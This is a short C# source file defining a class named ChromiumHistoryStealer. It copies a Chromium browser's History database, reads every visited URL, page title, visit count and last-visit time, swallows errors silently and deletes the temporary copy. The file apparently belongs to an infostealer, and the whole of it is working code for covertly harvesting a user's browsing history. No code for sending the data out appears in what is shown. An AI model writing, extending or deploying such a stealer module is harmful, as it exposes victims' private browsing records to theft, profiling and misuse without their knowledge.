using System;
using System.IO;
using System.Collections.Generic;
using System.Data.SQLite;

public class ChromiumHistoryStealer
{
    public static List<HistoryModel> GetHistory(string path)
    {
        if (!System.IO.File.Exists(path))
        {
            return new List<HistoryModel>();
        }

        path = FileUtils.CopyFile(path);
        List<HistoryModel> data = new List<HistoryModel>();

        if (File.Exists(path))
        {
            try
            {
                using (var conn = new SQLiteConnection($"Data Source={path}"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600, 'unixepoch') AS last_visit FROM urls";
                    conn.Open();

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            try
                            {
                                data.Add(new HistoryModel()
                                {
                                    URL = reader.GetString(0),
                                    Title = reader.GetString(1),
                                    VisitCount = reader.GetInt32(2),
                                    LastVisitUTC = reader.GetString(3)
                                });
                            }
                            catch
                            {

                            }
                        }
                    }

                    conn.Close();
                    conn.Dispose();
                }
            }
            catch
            {

            }
        }

        System.IO.File.Delete(path);
        return data;
    }
}